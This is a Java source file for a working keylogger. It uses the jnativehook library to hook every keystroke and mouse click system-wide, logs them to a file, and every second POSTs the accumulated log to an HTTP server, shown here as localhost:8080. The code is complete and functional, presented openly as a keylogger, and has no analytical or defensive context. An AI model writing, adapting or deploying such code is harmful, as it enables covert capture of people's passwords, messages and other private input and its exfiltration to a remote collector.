//import org.jnativehook.GlobalScreen;
//import org.jnativehook.NativeHookException;
//import org.jnativehook.keyboard.NativeKeyEvent;
//import org.jnativehook.keyboard.NativeKeyListener;
//import org.jnativehook.mouse.NativeMouseEvent;
//import org.jnativehook.mouse.NativeMouseListener;

// https://github.com/kwhat/jnativehook
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseEvent;
import com.github.kwhat.jnativehook.mouse.NativeMouseListener;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Keylogger implements NativeKeyListener, NativeMouseListener {
    private static final String LOG_FILE_PATH = "keystrokes.log";
    private static final String LAST_SENT_FILE_PATH = "last_sent_keystrokes.txt";
    //private static final int SEND_INTERVAL = 5 * 60 * 1000; // 5 minutes
    private static final int SEND_INTERVAL = 1 * 1000; // 1 second
    private String lastSentData = "";

    public Keylogger() {
        loadLastSentData();
    }

    private void loadLastSentData() {
        File lastSentFile = new File(LAST_SENT_FILE_PATH);
        if (lastSentFile.exists()) {
            try {
                lastSentData = new String(Files.readAllBytes(lastSentFile.toPath()), StandardCharsets.UTF_8);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void saveLastSentData(String data) {
        try {
            Files.write(Paths.get(LAST_SENT_FILE_PATH), data.getBytes(StandardCharsets.UTF_8));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        logToFile("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    @Override
    public void nativeMouseClicked(NativeMouseEvent e) {
        logToFile("Mouse Clicked at: " + e.getX() + ", " + e.getY());
    }

    private void logToFile(String data) {
        File logFile = new File(LOG_FILE_PATH);
        boolean append = logFile.exists();
        try (
            FileWriter fw = new FileWriter(LOG_FILE_PATH, append);
            BufferedWriter bw = new BufferedWriter(fw)) {
            bw.write(data);
            bw.newLine();
            System.out.println("Logged to file: " + data); // Debugging line
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendDataToServer() {
        while (true) {
            try {
                Thread.sleep(SEND_INTERVAL);
                File logFile = new File(LOG_FILE_PATH);
                if (!logFile.exists()) continue;
                try (
                    FileInputStream fis = new FileInputStream(logFile)) {
                    byte[] data = new byte[(int) logFile.length()];
                    fis.read(data);
                    String currentData = new String(data, StandardCharsets.UTF_8);

                    // Check if the data is the same as the last sent data
                    if (currentData.equals(lastSentData)) {
                        System.out.println("Data is the same as last sent, skipping...");
                        continue;
                    }
                    URI uri = new URI("http://localhost:8080");
                    URL url = uri.toURL();
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    try (OutputStream os = conn.getOutputStream()) {
                        os.write(data);
                        os.flush();
                    }
                    //Files.write(Paths.get(LOG_FILE_PATH), "".getBytes());
                    System.out.println("Data sent to server. Response: " + conn.getResponseCode());

                    // Update the last sent data and save it to file
                    lastSentData = currentData;
                    saveLastSentData(lastSentData);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void scheduleDataSending() {
        Timer timer = new Timer();
        TimerTask task = new TimerTask() {
            @Override
            public void run() {
                sendDataToServer();
            }
        };
        timer.schedule(task, SEND_INTERVAL, SEND_INTERVAL);
    }

    public static void main(String[] args) {
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            ex.printStackTrace();
            System.exit(1);
        }
        Keylogger keylogger = new Keylogger();
        GlobalScreen.addNativeKeyListener(keylogger);
        GlobalScreen.addNativeMouseListener(keylogger);
        
        // Add shutdown hook
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            keylogger.cleanup();
        }));

        keylogger.scheduleDataSending();
    }

    private void cleanup() {
        System.out.println("Shutting down gracefully...");
        try {
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException ex) {
            ex.printStackTrace();
        }
    }
}